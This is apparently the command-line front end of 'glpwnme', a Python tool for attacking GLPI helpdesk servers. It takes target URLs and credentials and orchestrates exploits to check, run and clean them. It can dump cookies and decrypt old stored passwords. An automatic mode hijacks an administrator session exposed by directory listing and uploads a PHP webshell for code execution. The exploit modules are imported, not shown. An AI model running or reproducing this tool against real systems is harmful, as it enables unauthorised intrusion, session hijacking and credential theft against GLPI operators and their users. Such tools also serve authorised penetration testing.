import argparse
import requests
from packaging import version
from glpwnme.exploits.utils import *
from glpwnme.exploits.implementations import *
from glpwnme.exploits.orchestrator import ExploitOrchestrator
from glpwnme.exploits.logger import Log, KiddieLogger

__all__ = ["run_cli"]

def header():
    """
    Print the header of the tool
    """
    Log.print("[b black on blue]\uE0B0 GlpwnMe [/b black on blue][blue]\uE0B0[/blue] by [b u blue]RIOUX Guilhem[/b u blue]")

class GlpwnMe:
    """
    Class running the workflow
    """
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='Script to check instance of glpi')
        self.args = None

    def parse(self):
        """
        Parse the arguments needed
        """
        # Target options
        self.parser.add_argument('-t', '--target', required=True, help='Target url to attack')

        # Authentication options
        self.parser.add_argument("-u", "--username", help="Username to use")
        self.parser.add_argument("-p", "--password", help="Password to use")
        self.parser.add_argument("--token", help="Token for login into glpi")
        self.parser.add_argument("--cookie", help="Cookie value for login into glpi")
        self.parser.add_argument("--auth", help="Auth to use (default taken from glpi)")
        self.parser.add_argument("--profile", help="Profile to use (if any)")

        # Exploit options
        self.parser.add_argument("-e", "--exploit", help="The exploit to use")
        self.parser.add_argument("--run", help="Specify to run the exploit and not to check it", action="store_true")
        self.parser.add_argument("--clean", help="Specify to clean the exploit traces if implemented", action="store_true")
        self.parser.add_argument("--check", help="Specify to check the exploit if implemented", action="store_true")
        self.parser.add_argument("--check-all", help="Check all the exploits available on the target", action="store_true")
        self.parser.add_argument("--no-opsec", help="Check even if the exploit is noted as not opsec safe", action="store_false")
        self.parser.add_argument("--infos", help="Display the informations about an exploit", action="store_true")
        self.parser.add_argument("-O", "--options", help="Options to add for the exploit", nargs="+")

        # Others
        self.parser.add_argument("--dump-cookies", help="Just login on the target and dump the cookies", action="store_true")
        self.parser.add_argument("--no-init", help="Do not init the session", action="store_true")
        self.parser.add_argument('--proxy', help='Full url for the proxy')
        self.parser.add_argument("-H", "--header", help="Header(s) to add", nargs="+")
        self.parser.add_argument("--list-plugins", help="Try to enum plugins on the target", action="store_true")
        self.parser.add_argument("--decrypt-old", help="Decrypt old password on GLPI version below or equal to 9.4.6")

        self.args = self.parser.parse_args()

    def __getattr__(self, name):
        return getattr(self.args, name, "")

def headers_to_dict(headers, separator=":"):
    """
    Parse the list of headers and return a
    dict containing the header ready to use
    Also used for the options

    .. code-block:: python

        >>> options = ["db=glpi_users", "columns=name,password"]
        >>> headers_to_dict(options, "=")
        {'db': 'glpi_users', 'columns': 'name,password'}
        >>>

    :param headers: The headers provided by the user
    :type headers: List[str]

    :return: The dict containing the header for python
    :rtype: Dict[str, str]
    """
    if not headers:
        return None

    headers_dict = {}
    for header in headers:
        key, val = header.split(separator, 1)
        headers_dict[key.strip()] = val.strip()
    return headers_dict

def run_cli():
    """
    Run glpwnme
    """
    glpwnme = GlpwnMe()
    glpwnme.parse()

    session = GlpiSession(target=glpwnme.target,
                          proxies=glpwnme.proxy,
                          headers=headers_to_dict(glpwnme.header),
                          credentials=GlpiCredentials(glpwnme.username,
                                                      glpwnme.password,
                                                      glpwnme.auth,
                                                      glpwnme.token,
                                                      glpwnme.cookie,
                                                      glpwnme.profile))

    init_exploits = list(map(lambda exploit: exploit(session), get_all_exploits()))
    exploit_options = headers_to_dict(glpwnme.options, separator="=")
    orchestrator = ExploitOrchestrator(init_exploits)

    if(glpwnme.exploit and glpwnme.infos):
        orchestrator.show_infos_about(glpwnme.exploit)

    elif glpwnme.decrypt_old:
        Log.print(f"Trying to decrypt password: [b blue]{glpwnme.decrypt_old}[/b blue]")
        res = GlpiUtils.decrypt_old(glpwnme.decrypt_old)
        try:
            print(res.decode())
        except:
            print(res)

    elif glpwnme.list_plugins:
        from glpwnme.exploits.plugins_enum import PluginEnums
        plugin_enumerator = PluginEnums(session)
        plugin_enumerator.run()
        plugin_enumerator.show_plugins_found()

    elif(glpwnme.check_all or glpwnme.exploit or glpwnme.dump_cookies):
        try:
            ### TODO, login before initializing the session if credentials are provided
            if not glpwnme.no_init:
                session.init_session()
                if(session.glpi_infos.session_dir_listing
                    and session.glpi_infos.glpi_version
                    and version.parse(session.glpi_infos.glpi_version) < version.parse("10.0.18")):
                    go_on = Log.ask("Do you want [b]glpwnme[/] to achieve"
                                    " [red]code execution[/red] automatically ?")

                    if go_on:
                        from glpwnme.input_reader import GlpwnmeAnime
                        KiddieLogger.display(f"[+] Script kiddie mode enabled...", "\x1b[32m")
                        KiddieLogger.display(f"[+] Searching cookie...", "\x1b[32m")
                        sess = session.find_admin_user_from_dir_listing()
                        if sess:
                            session.skip_check = True
                            KiddieLogger.display(f"[+] Admin cookie: {sess}", "\x1b[32m")
                            KiddieLogger.display(f"[+] Starting hacking...", "\x1b[31m")
                            GlpwnmeAnime.start()
                            try:
                                orchestrator.run_exploit("PHP_UPLOAD", {"quiet": False})
                            except Exception as e:
                                KiddieLogger.display(f"[+] Webshell crashed before landing...", "\x1b[31m")
                                Log.err(e)
                        else:
                            KiddieLogger.display(f"[-] No administrator session found...", "\x1b[31m")
                        exit(0)

        except requests.exceptions.ConnectionError as e:
            Log.err("It seems that the target is unavailable,"
                    " [b]Check your internet connections !!![/b]")
            Log.err(e)
            exit(1)

        if glpwnme.dump_cookies:
            if session.login_with_credentials():
                Log.msg(*session.get_login_cookie(), sep="; ") # Trickshot from Romain
            else:
                Log.err("Login failed")

        elif glpwnme.check_all:
            Log.log("Checking all exploits...")
            potential_exploits = orchestrator.get_checked_exploits(glpwnme.no_opsec)
            if potential_exploits:
                Log.msg("Exploits working on target:")
                ExploitOrchestrator.display_exploits(potential_exploits)
            else:
                Log.err("No exploit compatible found")

        elif glpwnme.exploit:
            if glpwnme.run:
                try:
                    orchestrator.run_exploit(glpwnme.exploit, exploit_options)
                except Exception as e:
                    Log.err(e)

            elif glpwnme.check:
                orchestrator.check_exploit(glpwnme.exploit, glpwnme.no_opsec)

            elif glpwnme.clean:
                try:
                    orchestrator.clean_exploit(glpwnme.exploit, exploit_options)
                except Exception as e:
                    Log.err(e)

            else:
                Log.err("Please specify an action with the exploit: --check, --run, --clean or --infos")

    else:
        header()
        ExploitOrchestrator.display_exploits(orchestrator.exploits)
        Log.print(f"There are currently [i b]{len(orchestrator.exploits)}[/] [u]exploits[/] available")
        Log.log("Choose among the actions:")
        Log.log("(--check-all or --exploit <exploit name>), --check, --run, --clean, --infos")
